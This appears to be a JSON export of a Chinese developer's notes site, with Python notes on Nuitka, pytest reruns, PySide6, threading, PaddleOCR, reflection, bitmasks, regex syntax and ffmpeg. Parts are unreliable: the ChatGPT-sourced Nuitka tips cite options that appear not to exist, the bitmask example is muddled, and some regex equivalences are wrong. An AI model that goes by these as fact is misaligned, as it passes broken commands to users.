指示编译器是否应该跟踪导入并包含它们。 如果设置为 true，则 nuitka 将跟踪所有导入的模块，并将其包含在生成的可执行文件中。\n这通常用于确保所有依赖项都包括在二进制文件中，以便在运行时可以访问它们。 如果设置为 false，则 nuitka 不会在编译过程中跟踪导入，因此生成的二进制文件可能会缺少一些必要的依赖项。 默认情况下，该选项的值为 false。 你可以通过以下命令行选项来设置 follow_imports nuitka --follow-imports myscript.py 或者在 YAML 配置文件中使用: follow_imports: true 来启用该选项。 增量编译 技巧 来源于 ChatGpt Nuitka是一个Python编译器，它将Python源代码编译成C++代码，以获得更快的执行速度。\n默认情况下，Nuitka会进行完整的构建，这意味着每次更改源代码时都需要重新编译整个程序。 然而，Nuitka支持增量编译，它只会重新编译发生更改的源文件，而不是整个程序。\n这可以通过使用--module-mode参数来实现。例如，要对名为example.py的源文件进行增量编译，请使用以下命令: nuitka --module-mode example.py 这将生成一个名为example.so的共享库文件，其中包含编译后的代码。\n如果您对example.py进行了更改，则只需要重新运行此命令即可仅重新编译更改的部分，而无需重新编译整个程序。 请注意，增量编译可能会导致一些问题，因为某些更改可能会影响其他源文件。\n在这种情况下，您可能需要重新编译整个程序，以确保所有部分都是最新的。 进程调试 对于使用nuitka编译好的应用, 如何调试? 前提: 安装debug版的python , 参考 debug版本python安装 首先, 源码中导入\"ptvsd\"模块并添加\"ptvsd.enable_attach()\"语句。\n这个语句会在程序启动时暂停,等待调试器附加: import ptvsd\n\n# Enable debugger\nptvsd.enable_attach('my_secret_password')\n\n# Program code\n... 其次, 使用 nuitka 编译时, 增加debug和python-debug参数: # /usr/local/python/python3.9.10/bin/python3.9 -m nuitka --python-debug main.py\npython -m nuitka --debug --python-debug myprogram.py 然后, 启动构建好的应用程序。程序启动后会暂停等待调试器连接。 在PyCharm中,选择\"Run\" -> \"Attach to Process...\",\n然后在弹出窗口选择\"Python Attach\"并点击\"Connect to process on host\"选项。 在\"Gateway\"输入框中输入应用程序暂停时显示的\"ptvsd\"信息,包括密码。然后点击\"Attach\"。 PyCharm成功连接后,可以设置断点、查看变量、单步执行等进行调试。 完成调试后,点击\"Detach\"断开连接。程序将继续运行。 !! 经过多方测试, 不行, 只有使用gdb调..., mac下是lldb 特殊情况调试 普通情况下 进程调试 已经能满足需求, 但是有时, 是从源码编译安装的Python,\n就会有些库找不到等问题. 对于此种情况, 做一个说明. 假设主程序my_program.py，需要使用静态链接的 Python 库 /opt/python/lib/libpython3.9.a 进行编译。 方案一: 可以先设置 NUITKA_PYTHON_LIB 环境变量: export NUITKA_PYTHON_LIB=/opt/python/lib/libpython3.9.a 然后使用 nuitka 命令进行编译: nuitka --standalone my_program.py 这将生成一个独立的可执行文件 my_program.bin，其中包含了静态链接的 Python 库。 方案二: 另一种方式是在 nuitka 命令中直接指定 Python 库的路径和名称: nuitka --standalone --python-flag=-L/opt/python/lib --python-flag=-lpython3.9 my_program.py 这将生成与上面相同的独立可执行文件。\n注意，--python-flag=-L 选项指定 Python 库所在的目录，--python-flag=-l 选项指定 Python 库的名称。 注解 实际操作可能有不同, 我在ubuntu20上使用ubuntu16编译的python3.7, nuitka编译时指定--python-debug老是报错:\nlibpython找不到或者当前python不支持: fatal: error, static libpython isnot found or not supported for this python installed 试过加环境变量, 加命令行选项都不行, 故此小节有待更新. 原理/底层部分说明 编译过程 Nuitka的编译过程分为三个步骤： 分析：对Python代码进行语法和语义分析，并生成内部表示。 优化：对内部表示进行各种优化，包括常量折叠、无用代码消除、函数内联、循环展开等。 生成代码：将优化后的内部表示转化为C或机器码，并生成可执行文件。 C代码生成 当选择将Python代码编译成C代码时，会生成一个.c和一个.h文件。\n其中，.c文件包含了Python代码的C语言实现，.h文件包含了Python对象的定义、函数原型等信息。\n这两个文件可以被编译成一个可执行文件。 需要注意的是，由于Python是一种动态语言，对象类型和大小在运行时才能确定。\n因此，在生成C代码时，需要对每个对象进行类型检查，并根据类型分发到不同的实现中。\n这导致了生成的C代码比较复杂，且不易阅读。 二进制代码生成 当选择将Python代码编译成机器码时，会生成一个可执行文件。\n与C代码生成相比，机器码生成不需要进行类型检查，因为机器码已经包含了对象类型和大小的信息。\n这使得生成的可执行文件比较小，且执行速度更快。 需要注意的是，由于机器码是与硬件平台相关的，因此生成的可执行文件只能在同一平台上运行。 性能优化 除了代码生成外，性能优化也是Nuitka的重要功能之一。\n它通过各种编译技术和优化算法，对Python代码进行优化，从而提高程序的执行效率。 其中，最常用的优化算法包括： 常量折叠：将多次出现的常量合并成一个。 无用代码消除：删除不会被执行的代码。 函数内联：将函数调用替换成函数体。 循环展开：将循环拆分成多个重复代码块。 需要注意的是，在进行代码优化时，可能会改变原有的程序行为。因此，你需要仔细测试编译后的代码，确保其正确性和可靠性。 gcc相关环境变量 主要是使用nuitka生成c代码之后, 会用到gcc将代码编译成执行文件. 相关环境变量, gcc本身的环境变量此处不做说明, 可见 gcc_相关环境变量 nuitka支持的相关环境变量: NUITKA_CC: 使用gcc编译时, 使用相关参数/选项,\n如 export NUITKA_CC=\"gcc -I/path/to/header/files -L/path/to/library/files -lexample\" ,\n-I参数指定头文件路径，-L参数指定库文件路径，-lexample参数指定要链接的库文件名.\n若同时指定了CC环境变量, NUITKA优先. NUITKA_EXTRA_CFLAGS: 指定额外的参数. NUITKA_EXTRA_CFLAGS: 指定链接器（如ld）的选项 报错找不到Python标准库文件 对于Python标准库的文件, 一般只要使用到, 编译的时候都是会自动导入,\n但是有一种情况, 某些原因下可能没跟踪到所以不会导(比如你是在一个不会被跟踪的模块下导入),\n这时候需要显示导入, 比如能跟踪到的地方写下导入语句, 比如bdb: import bdb 同时, 这种情况下是无法使用 --include-module=bdb 来处理的, 原因暂时未知.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-nuitka.html","loc":"/yq-docs-rear-end-python-python-three--party-library-nuitka.html"},{"title":"pytest-rerunfailures","text":"支持使用 Pytest 时候的重试. 安装: pip3 install pytest-rerunfailures 使用: # --reruns 5        重试五次\n# --reruns-delay 2  每次重试间隔2秒\npytest --reruns 5 --reruns-delay 2 -s 选项参数 --reruns= <int> 执行失败时重试次数 --reruns-delay= <int> 执行失败重试之间的间隔","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytest-everunfailures.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytest-everunfailures.html"},{"title":"GUI开发之QT","text":"前言 Qt是由C++开发的跨平台GUI框架, 针对Python有提供相应的Api 题主系统: MacOs 13 QT的Python相关框架 PyQt 第三方公司产品, 开源协议为GPL协议, 意味着使用此库, 所开发产品必须开源 PySide QT的亲子, 开源协议为LGPL协议, 使用此库, 开不开源皆自由 PySide2对应QT5; PySide6对应Qt6 两者提供接口基本一致 此处主要介绍用 PySide6 PySide6 安装PySide6 pip install pyside6 设计界面 QtWidget 当前最常用 QML 较新型, QT正在推广 此处主要使用 QtWidget 使用QtWidget开发 designer 图形化开发 命令行执行 pyside6-designer 启动 在 Mac 下启动如下所示 后续操作自己探索吧, 这界面没有 windows 版熟悉, 暂时不想研究 界面设计完成后可以保存为UI后缀文件,\n使用 pyside6-uic $file.ui >ui.py 转换成py文件才可以使用 注解 生成的文件编码不是utf-8 手动编码 见 pyside6","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-GUI-development-QT.html","loc":"/yq-docs-rear-end-python-Tutorial-GUI-development-QT.html"},{"title":"多线程","text":"线程是进程的子任务，cpu调度和分配的基本单位，实现进程内并发。 启动一个新线程可使用 threading 模块 线程同步技术： 解决多个线程争抢同一个资源的情况，线程协作工作。一份数据同一时刻只能有一个线程处理。 解决线程同步的几种方法: Lock、RLock、Condition、Barrier、semaphore 线程间通信 互斥量 :  通过互斥机制防止多个线程同时访问公共资源。 信号量（Semphare）:  控制同一时刻多个线程访问同一个资源的线程数。 ps: python的threading 文档 事件（信号）:  通过通知的方式保持多个线程的同步。 互斥量 互斥锁(mutex)/互斥量 python Linux中提供一把互斥锁mutex（也称之为互斥量） 使用, threading模块中定义了Lock变量，这个变量本质上是一个函数，通过调用这个函数可以获取一把互斥锁: # 创建锁\nmutex = threading.Lock()\n\n# 上锁\nmutex.acquire()\n\n# 这里编写代码能保证同一时刻只能有一个线程去操作, 对共享数据进行锁定...\n\n# 释放锁\nmutex.release() Python重互斥量的实现有以下几种形式 threading.Condition() :\nCondition对象提供了wait()、notify()和notify_all()等方法，可以用于控制多个线程的执行。在多个线程共享一个变量时，可以使用Condition对象来确保多个线程按照特定的顺序访问共享变量。 总体上包含了一个Lock对象和一个wait set。\n该对象主要提供了以下三个方法: wait():释放内部锁并阻塞线程,将线程加入到wait set中。 notify():唤醒 wait set 中的一个线程。 notify_all():唤醒 wait set 中的所有线程。 notify()和notify_all()的区别在于: notify()只会唤醒wait set中的一个线程,并将其从wait set中移除。其余线程仍然阻塞。 notify_all()会唤醒wait set中的所有线程,并将它们全部从wait set中移除。 threading.Semaphore() :\n计数信号量, 它允许多个线程同时访问共享资源，但需要限制同时访问该资源的线程数量。\nSemaphore对象包含一个计数器，每当一个线程访问共享资源时，该计数器就会减1。当计数器为0时，其它线程将被阻塞。 threading.Event() :\n线程同步工具，用于线程间通信。它包含一个标志，可以通过set()和clear()方法设置或清除。当一个线程调用set()方法时，其他线程可以通过wait()方法等待该事件发生。 queue.Queue() : 线程安全的先进先出队列, 底层还是锁机制","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-Multithreading.html","loc":"/yq-docs-rear-end-python-Concept-Multithreading.html"},{"title":"OCR识别","text":"OCR (Optical Character Recognition), 光学字符识别 简单baidu了一下, 看到了一篇 几种python入门级OCR开源库中文识别效果对比 作者推荐使用 PaddleOCR 安装: pip install paddlepaddle shapely paddleocr 例: 演示图片: 代码: def ocr_with_paddle(img: str) -> list:\n    from paddleocr import PaddleOCR, draw_ocr\n\n    ocr_pad = PaddleOCR(use_angle_cls=True, lang=\"ch\")\n    result = ocr_pad.ocr(img, cls=True)\n    return result\n\n\nif __name__ == '__main__':\n    _img = './img.png'\n    r = ocr_with_paddle(_img)\n    for x in r:\n        for y in x:\n            print(y)\n\n    for x in r:\n        for y in x:\n            print(y[1][0]) 结果: [2023/03/16 11:34:21] ppocr DEBUG: Namespace(help='==SUPPRESS==', use_gpu=False, use_xpu=False, use_npu=False, ir_optim=True, use_tensorrt=False, min_subgraph_size=15, precision='fp32', gpu_mem=500, image_dir=None, page_num=0, det_algorithm='DB', det_model_dir='/Users/yanque/.paddleocr/whl/det/ch/ch_PP-OCRv3_det_infer', det_limit_side_len=960, det_limit_type='max', det_box_type='quad', det_db_thresh=0.3, det_db_box_thresh=0.6, det_db_unclip_ratio=1.5, max_batch_size=10, use_dilation=False, det_db_score_mode='fast', det_east_score_thresh=0.8, det_east_cover_thresh=0.1, det_east_nms_thresh=0.2, det_sast_score_thresh=0.5, det_sast_nms_thresh=0.2, det_pse_thresh=0, det_pse_box_thresh=0.85, det_pse_min_area=16, det_pse_scale=1, scales=[8, 16, 32], alpha=1.0, beta=1.0, fourier_degree=5, rec_algorithm='SVTR_LCNet', rec_model_dir='/Users/yanque/.paddleocr/whl/rec/ch/ch_PP-OCRv3_rec_infer', rec_image_inverse=True, rec_image_shape='3, 48, 320', rec_batch_num=6, max_text_length=25, rec_char_dict_path='/usr/local/lib/python3.9/site-packages/paddleocr/ppocr/utils/ppocr_keys_v1.txt', use_space_char=True, vis_font_path='./doc/fonts/simfang.ttf', drop_score=0.5, e2e_algorithm='PGNet', e2e_model_dir=None, e2e_limit_side_len=768, e2e_limit_type='max', e2e_pgnet_score_thresh=0.5, e2e_char_dict_path='./ppocr/utils/ic15_dict.txt', e2e_pgnet_valid_set='totaltext', e2e_pgnet_mode='fast', use_angle_cls=True, cls_model_dir='/Users/yanque/.paddleocr/whl/cls/ch_ppocr_mobile_v2.0_cls_infer', cls_image_shape='3, 48, 192', label_list=['0', '180'], cls_batch_num=6, cls_thresh=0.9, enable_mkldnn=False, cpu_threads=10, use_pdserving=False, warmup=False, sr_model_dir=None, sr_image_shape='3, 32, 128', sr_batch_num=1, draw_img_save_dir='./inference_results', save_crop_res=False, crop_res_save_dir='./output', use_mp=False, total_process_num=1, process_id=0, benchmark=False, save_log_path='./log_output/', show_log=True, use_onnx=False, output='./output', table_max_len=488, table_algorithm='TableAttn', table_model_dir=None, merge_no_span_structure=True, table_char_dict_path=None, layout_model_dir=None, layout_dict_path=None, layout_score_threshold=0.5, layout_nms_threshold=0.5, kie_algorithm='LayoutXLM', ser_model_dir=None, re_model_dir=None, use_visual_backbone=True, ser_dict_path='../train_data/XFUND/class_list_xfun.txt', ocr_order_method=None, mode='structure', image_orientation=False, layout=True, table=True, ocr=True, recovery=False, use_pdf2docx_api=False, lang='ch', det=True, rec=True, type='ocr', ocr_version='PP-OCRv3', structure_version='PP-StructureV2')\n[2023/03/16 11:34:22] ppocr DEBUG: dt_boxes num : 3, elapse : 0.06923604011535645\n[2023/03/16 11:34:22] ppocr DEBUG: cls num  : 3, elapse : 0.019355058670043945\n[2023/03/16 11:34:24] ppocr DEBUG: rec_res num  : 3, elapse : 1.6617558002471924\n[[[12.0, 28.0], [254.0, 28.0], [254.0, 41.0], [12.0, 41.0]], ('时，一定要注意不能包裹while语句', 0.8965110778808594)]\n[[[11.0, 109.0], [32.0, 109.0], [32.0, 126.0], [11.0, 126.0]], ('例：', 0.9490082263946533)]\n时，一定要注意不能包裹while语句\n例： 注: 第一次使用时会下载一些包. 比如我的下载到了用户目录下的 .paddleocr 位置: yanque@yanquedembp docker % ls -lh ~/.paddleocr/whl/*\n/Users/yanque/.paddleocr/whl/cls:\ntotal 0\ndrwxr-xr-x@ 5 yanque  staff   160B  3 16 11:30 ch_ppocr_mobile_v2.0_cls_infer\n\n/Users/yanque/.paddleocr/whl/det:\ntotal 0\ndrwxr-xr-x@ 3 yanque  staff    96B  3 16 11:30 ch\n\n/Users/yanque/.paddleocr/whl/rec:\ntotal 0\ndrwxr-xr-x@ 3 yanque  staff    96B  3 16 11:30 ch","tags":"后端; python","url":"/yq-docs-rear-end-python-Related-technology-implementation-OCR-identification.html","loc":"/yq-docs-rear-end-python-Related-technology-implementation-OCR-identification.html"},{"title":"Python网络编程","text":"Socket又称\"套接字\"，应用程序通常通过\"套接字\"向网络发出请求或者应答网络请求，使主机间或者进程间可以通讯。 Python 提供了两种服务模块: socket 底层网络接口, 提供了访问 BSD 套接字 的接口 socketserver 网络服务器框架, 简化网络服务器开发","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Python-network-programming.html","loc":"/yq-docs-rear-end-python-Tutorial-Python-network-programming.html"},{"title":"使用python下载文件","text":"方式 requests wget urllib awscli & boto3","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Use-python-to-download-files.html","loc":"/yq-docs-rear-end-python-Tutorial-Use-python-to-download-files.html"},{"title":"Python利用反射实例对象","text":"如果不局限于使用反射, 可以考虑使用 eval 函数, 此函数会将传入的字符串当作Python代码执行. 反射 反射(reflection)是一个编程语言的能力,允许程序在运行时检查和修改它自己的结构和行为。\n如让程序在运行时发现和修改它自身的属性、方法的结构和动态地创建和执行。 反射主要具有以下几个功能: 自我检查:程序可以在运行时检查自身的结构,获取类、方法、属性的信息。 自我修改:程序在运行时可以修改自身的结构,添加、删除或者修改类、方法、属性。 动态加载:可以在运行时加载外部类和编译好的代码。 避免硬编码:通过反射可以避免将字符串、类名等硬编码在程序中。 通常,反射用于以下几个方面: 框架设计:通过反射实现动态加载类,避免硬编码类名,增强灵活性。 动态代理:通常使用反射生成代理类和代理方法。 ORM框架:通过反射读取类的属性与数据库字段对应。 IoC容器:通过反射动态实例化类,实现依赖注入。 动态编译器:通过反射生成动态类和方法。 使用importlib 见: importlib 如有一个model.py内容如下: class Person:\n  def __init__(self, name):\n    self.name = name 在main.py调用: import importlib\n\nmodule = importlib.import_module('module')\nc = getattr(module, 'Person')\np = c('Jack')\nprint(p.name)  # Jack","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Use-reflex-instance-objects.html","loc":"/yq-docs-rear-end-python-Tutorial-Use-reflex-instance-objects.html"},{"title":"Python重写父类方法参数列表问题","text":"介绍 使用 Pycharm 时, 当重写父类时, 若定义了不同的参数列表, 会出现警告. 这是因为: 由于增加了参数，从而改变了同父类方法的一致性违反了LSP原则（在使用父类的场景，替换为子类也一样可行）。 解决方式为，在子类重写的方法中为参数里添加默认值赋值，这样就确保了父类方法中定义的参数在子类中一定不会失效从而确保了自上而下的一致性。 只可新增参数, 同时设定默认值 源码","tags":"后端; python","url":"/yq-docs-rear-end-python-conclusion-of-issue-Python-rewrite-the-parent-class-parameter-list-issues.html","loc":"/yq-docs-rear-end-python-conclusion-of-issue-Python-rewrite-the-parent-class-parameter-list-issues.html"},{"title":"关于位掩码","text":"位掩码（BitMask），是\"位（Bit）\"和\"掩码（Mask）\"的组合词。\n\"位\"指代着二进制数据当中的二进制位，\n而\"掩码\"指的是一串用于与目标数据进行按位操作的二进制数字。\n组合起来，就是\"用一串二进制数字（掩码）去操作另一串二进制数字\"的意思。 一般将1左移多少位表示位掩码来进行位运算,\n解决当数量多时, 判断的复杂度高的问题 注解 1 << 0 表示 1左移0位 ,\n而不是 0左移1位 常见于权限分配 比如一个系统有四个权限位: delete = 0\nread = 1\nupdate = 2\ncreate = 3 但是如果用位掩码(mask = 0b1)来查询是否有update权限: delete = 1 << 0     // 0000 0001\nread = 1 << 1     // 0000 0010\nupdate = 1 << 2     // 0000 0100\ncreate = 1 << 3     // 0000 1000 如果用户的只有读权限 update, 直接bool判断: 1 << 1 & 1 << 2   // false,  0000 0010 & 0000 0100 如果要加 update , 使用异或: 1 << 1  &#94; 1 << 2  // 0000 0010 &#94; 0000 0100 = 0000 0110 如果 进制表示前缀 二进制前缀: 0b 经典问题-3只老鼠找8瓶水毒 有一个很经典的算法题，说是有1000个一模一样的瓶子，\n其中有999瓶是普通的水，有一瓶是毒药。\n任何喝下毒药的生物都会在一星期之后死亡。\n现在，你只有10只小白鼠和一星期的时间，如何检验出哪个瓶子里有毒药？\n如果按照常规的解法是不是很繁琐，我们不妨思考一下用二进制来处理。 具体实现跟 3个老鼠确定8个瓶子 原理一样: 000=0\n001=1\n010=2\n011=3\n100=4\n101=5\n110=6\n111=7 一位表示一个老鼠，0-7表示8个瓶子。\n也就是分别将1、3、5、7号瓶子的药混起来给老鼠1吃，\n2、3、6、7号瓶子的药混起来给老鼠2 吃，\n4、5、6、7号瓶子的药混起来给老鼠3吃， 哪个老鼠死了，相应的位标1。 如老鼠1死了、老鼠2没死、老鼠3死了，那么就是 101=5号瓶子有毒。\n同样道理10个老鼠可以确定1000个瓶子。","tags":"杂乱无章","url":"/yq-docs-Chaotic-About-bit-cover.html","loc":"/yq-docs-Chaotic-About-bit-cover.html"},{"title":"关于雪球-爆仓","text":"地址: https://www.huxiu.com/article/2563407.html 防止地址失效, 搞成pdf了, ../../resources/pdf/咋就爆仓了？3分钟搞懂雪球产品-虎嗅网.pdf","tags":"杂乱无章","url":"/yq-docs-Chaotic-About-snowball.html","loc":"/yq-docs-Chaotic-About-snowball.html"},{"title":"浏览器地址栏输入url","text":"末尾加不加/的区别 一般情况下 不加 / 会当作下载资源, 比如chrome就会直接触发下载 加 / 当作地址目录访问","tags":"杂乱无章","url":"/yq-docs-Chaotic-Browser-input-URL.html","loc":"/yq-docs-Chaotic-Browser-input-URL.html"},{"title":"MOD之旅","text":"塞尔达的MOD 素材替换需要转换 RSTB (ResourceSizeTable.product.srsizetabl)， 即： 游戏内部RAM分配\n(创建BNP的时候 会计算) BNP都会带RSTB信息, 即 logs/rstb.json 一些工具： SIC独立物品生成器 Blender： 建模软件 ToolBox： 模型提取、Blender弄好的预览 Bcml： bnp生成， MOD整合","tags":"杂乱无章","url":"/yq-docs-Chaotic-MOD-journey.html","loc":"/yq-docs-Chaotic-MOD-journey.html"},{"title":"正则表达式","text":"正则表达式 - 菜鸟教程: https://www.runoob.com/regexp/regexp-syntax.html 字符表示 普通字符 [...] 匹配 [...] 中的所有字符 [&#94;...] 匹配除了 [...] 中的所有字符 \\s 匹配所有的空白字符, 包括换行 \\S 匹配所有空白符, 不包括换行 \\w 匹配字母, 数字, 下划线. 等价于 [A-Za-z0-9] 字符 描述 [ABC] 匹配 [...] 中的所有字符, 例如 `[aeiou] 匹配字符串 google runoob taobao 中所有的 e o u a 字母. [&#94;ABC] 匹配除了 [...] 中字符的所有字符, 例如 [&#94;aeiou] 匹配字符串 google runoob taobao 中除了 e o u a 字母的所有字母. [A-Z] [A-Z] 表示一个区间, 匹配所有大写字母, [a-z] 表示所有小写字母. . 匹配除换行符 (\\n, \\r) 之外的任何单个字符, 相等于 [&#94;\\n\\r] [\\s\\S] 匹配所有. \\s 是匹配所有空白符, 包括换行, \\S 非空白符, 不包括换行. \\w 匹配字母, 数字, 下划线. 等价于 [A-Za-z0-9_] 非打印字符 字符 描述 \\cx 匹配由 x 指明的控制字符. 例如, \\cM 匹配一个 Control-M 或回车符. x 的值必须为 A-Z 或 a-z 之一. 否则, 将 c 视为一个原义的 'c' 字符. \\f 匹配一个换页符. 等价于 \\x0c 和 \\cL . \\n 匹配一个换行符. 等价于 \\x0a 和 \\cJ . \\r 匹配一个回车符. 等价于 \\x0d 和 \\cM . \\s 匹配任何空白字符, 包括空格, 制表符, 换页符等等. 等价于 [ \\f\\n\\r\\t\\v] . 注意 Unicode 正则表达式会匹配全角空格符. \\S 匹配任何非空白字符. 等价于 [&#94; \\f\\n\\r\\t\\v] . \\t 匹配一个制表符. 等价于 \\x09 和 \\cI . \\v 匹配一个垂直制表符. 等价于 \\x0b 和 \\cK . 特殊字符 一些有特殊含义的字符\n若要匹配这些特殊字符, 必须首先使字符\"转义\", 即, 将反斜杠字符放在它们前面. 特别字符 描述 $ 匹配输入字符串的结尾位置. 如果设置了 RegExp 对象的 Multiline 属性, 则 $ 也匹配 \\n 或 \\r . 要匹配 $ 字符本身, 请使用 \\$ ( ) 标记一个子表达式的开始和结束位置. 子表达式可以获取供以后使用. 要匹配这些字符, 请使用 \\( 和 \\) * 匹配前面的子表达式零次或多次. 要匹配 * 字符, 请使用 \\* + 匹配前面的子表达式一次或多次. 要匹配 + 字符, 请使用 \\+ . . 匹配除换行符 \\n 之外的任何单字符. 要匹配 . , 请使用 \\. . [ 标记一个中括号表达式的开始. 要匹配 [ , 请使用 \\[ . ? 匹配前面的子表达式零次或一次, 或指明一个非贪婪限定符. 要匹配 ? 字符, 请使用 \\? \\ 将下一个字符标记为或特殊字符, 或原义字符, 或向后引用, 或八进制转义符. 例如, n 匹配字符 n . \\n 匹配换行符. 序列 \\\\ 匹配 \\ , 而 \\( 则匹配 ( &#94; 匹配输入字符串的开始位置, 除非在方括号表达式中使用, 当该符号在方括号表达式中使用时, 表示不接受该方括号表达式中的字符集合. 要匹配 &#94; 字符本身, 请使用 \\&#94; { 标记限定符表达式的开始. 要匹配 { , 请使用 \\{ . 限定符 限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配. 有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种. 正则表达式的限定符有: 字符 描述 * 匹配前面的子表达式零次或多次. 例如, zo* 能匹配 \"z\" 以及 \"zoo\". * 等价于 {0,} . + 匹配前面的子表达式一次或多次. 例如, 'zo+' 能匹配 \"zo\" 以及 \"zoo\", 但不能匹配 \"z\". + 等价于 {1,} . ? 匹配前面的子表达式零次或一次. 例如, \"do(es)?\" 可以匹配 \"do\" ,  \"does\" 中的 \"does\" ,  \"doxy\" 中的 \"do\" . ? 等价于 {0,1} . {n} n 是一个非负整数. 匹配确定的 n 次. 例如, 'o{2}' 不能匹配 \"Bob\" 中的 'o', 但是能匹配 \"food\" 中的两个 o. {n,} n 是一个非负整数. 至少匹配n 次. 例如, 'o{2,}' 不能匹配 \"Bob\" 中的 'o', 但能匹配 \"foooood\" 中的所有 o. 'o{1,}' 等价于 'o+' . 'o{0,}' 则等价于 'o*' . {n,m} m 和 n 均为非负整数, 其中n <= m. 最少匹配 n 次且最多匹配 m 次. 例如, \"o{1,3}\" 将匹配 \"fooooood\" 中的前三个 o. 'o{0,1}' 等价于 'o?'. 请注意在逗号和两个数之间不能有空格. 正则表达式-简洁版 正则表达式(regular expression)描述了一种字符串匹配的模式（pattern）,\n可以用来检查一个串是否含有某种子串, 将匹配的子串替换或者从某个串中取出符合某个条件的子串等. ​字符类: .                #任意一个字符\n[]               #匹配括号中的一个字符\n-                #括号内表示范围\n&#94;                #位于括号内开头表示不匹配括号内的 [&#94;0-3] 非（0到3）之间\n[[:xxx:]]        #grep工具预定义的一些命令字符类 数量限定符: ?                #匹配0或者1次\n+                #前一个单元匹配一次或者多次\n*                #匹配前一个单元0次或多次\n{N}                #前一个单元匹配N次\n{N,}            #前一个单元至少匹配N次\n{,M}            #前一个单元最多匹配M次\n{N,M}            #前一个单元匹配N至M次 注解 grep 找的是包含某个模式的行, 而非完全匹配. 位置限定符: &#94;                #匹配行首的位置\n$                #匹配行末的位置\n\\<                #匹配单词开头的位置\n\\>                #匹配单词结尾的位置\n\\b                #匹配以单词开头或者结尾的位置\n\\B                #匹配非该单词开头和结尾的位置, 与\\b相反 其他特殊字符: \\                 转义字符, 特殊与普通字符相互转换\n()                将正则表达式的部分括起来表示一个单元\n|                 连接两个子表达式表示或的关系\n?:                表示 非捕获组, 即该组的内容不会被单独捕获为匹配结果。 注解 竖线 | 的作用范围是比较广的, 或许这也是其于 [] 的区别: /apple|banana/    # 匹配 \"apple\" 或 \"banana\"\n/appl[es],banana/        # 匹配 \"apple,banana\" 或 \"appls,banana\" 正则表达式的模式 基础正则表达式(Basic) 扩展正则表达式(extended) Perl正则表达式(Perl) 区别: 基础正则和扩展正则的规范基本相同, 只是在Basic规范下,\n有些字符 ?, +, {}, (), | 解释为普通字符, 要表示\n特殊含义需要加 进行转义. 在Extended规范下, 这些符号被解释为特殊含义, 要取其字面值, 也要对其进行 \\ 转义. 其他常用通用字符集及其替换 符号 替换正则 匹配 \\d [0-9] 数字字符 \\D [&#94;0-9] 非数字字符 \\w [a-zA-Z0-9] 数字, 字母, 下划线 \\W [&#94;w] 非数字, 字母, 下划线 \\s [_rtnf] 回车, 换行, 制表符等空白区域 \\S [&#94;s] 非空白区域 贪婪模式与非贪婪模式 grep 默认的就是贪婪匹配, 会将一行中所有满足正则的全部匹配出来. 而非贪婪模式是一旦发现匹配符合要求, 立马匹配成功, 而不会继续匹配下去（除非有g, 开启下一组匹配） 零宽断言 用于指定一个位置, 这个位置应该满足一定的条件. 零宽度正预测 (?=正则表达式) 正则表达式所处位置之前, 不包括正则表达式指定的位置的单元. 零宽度正后顾后发断言 (?<=正则表达式) 正则表达式所处位置之后, 不包括正则表达式指定的位置的单元. linux-grep常用选项 见: grep 转义符 如下: \\                  表示开始转义, 在Python中处于行尾位置时表示续行符\n\\\\                 反斜杠\n\\‘                 单引号\n\\\"                 双引号\n\\b                 退格\n\\n                 换行\n\\v                 纵向制表符\n\\t                 横向制表符\n\\r                 回车\n\\f                 换页","tags":"杂乱无章","url":"/yq-docs-Chaotic-Regular-expression.html","loc":"/yq-docs-Chaotic-Regular-expression.html"},{"title":"搜索引擎实现","text":"数据一般分两类: 结构化数据, 如存储关系数据库中的数据, 查询时候可以直接 sql 语句查询到确定的结果 非结构化数据, 如文章, 如果存储在数据库中, 需要先查询所有文章, 再在每一篇文中检索 普通检索对于结构化数据不可行, 所以需要对其进行一定处理, 这就是 全文检索 将非结构化的数据中的一部分信息提取出来，然后以某种规则重组，使其变得有一定的结构，\n然后对此结构数据建立索引并进行搜索，从而达到快速搜索的目的。 比如 ElasticSearch 的 倒排索引","tags":"杂乱无章","url":"/yq-docs-Chaotic-Search-engine-implementation.html","loc":"/yq-docs-Chaotic-Search-engine-implementation.html"},{"title":"版本说明","text":"软件版本说明 软件版本说明: https://blog.csdn.net/gnail_oug/article/details/79998154 系统版本说明 X86: 系統是 32 bit 的版本 X86-64: 系统是 64 bit 的","tags":"杂乱无章","url":"/yq-docs-Chaotic-Version-description.html","loc":"/yq-docs-Chaotic-Version-description.html"},{"title":"ffmpeg介绍","text":"Python下有个三方库, 可见: ffmpeg 前言 FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。可以轻易地实现多种视频格式之间的相互转换。 名称来自于MPEG视频编码标准, FF代表 \"fast forawrd\". 包含以下部分 libavformat：用于各种音视频封装格式的生成和解析，包括获取解码所需信息以生成解码上下文结构和读取音视频帧等功能，包含demuxers和muxer库。 libavcodec：用于各种类型声音/图像编解码。 libavutil：包含一些公共的工具函数。 libswscale：用于视频场景比例缩放、色彩映射转换。 libpostproc：用于后期效果处理。 ffmpeg：是一个命令行工具，用来对视频文件转换格式，也支持对电视卡实时编码。 ffsever：是一个HTTP多媒体实时广播流服务器，支持时光平移。 ffplay：是一个简单的播放器，使用ffmpeg 库解析和解码，通过SDL显示。 ffprobe：收集多媒体文件或流的信息，并以人和机器可读的方式输出。 基本概念 容器(Container)与流(Stream) 容器包含流与文件头 容器/文件(Conainer/File) 即视频格式, 特定格式的多媒体文件，比如mp4、flv、mkv等 媒体流(Stream) 一种视频信息传输格式, 有5种: 音频、视频、字幕、附件、数据. 表示时间轴上的一段连续数据，如一段声音数据、一段视频数据或一段字幕数据，可以是压缩的，也可以是非压缩的，压缩的数据需要关联特定的编解码器。 数据帧/数据包(Frame/Packet) 帧代表一幅静止的图像，分为I帧，P帧，B帧。 通常，一个媒体流是由大量的数据帧组成的，对于压缩数据，帧对应着编解码器的最小处理单元，分属于不同媒体流的数据帧交错存储于容器之中。 一般情况下： Frame对应压缩前的数据，Packet对应压缩后的数据。 编解码器(Codec) 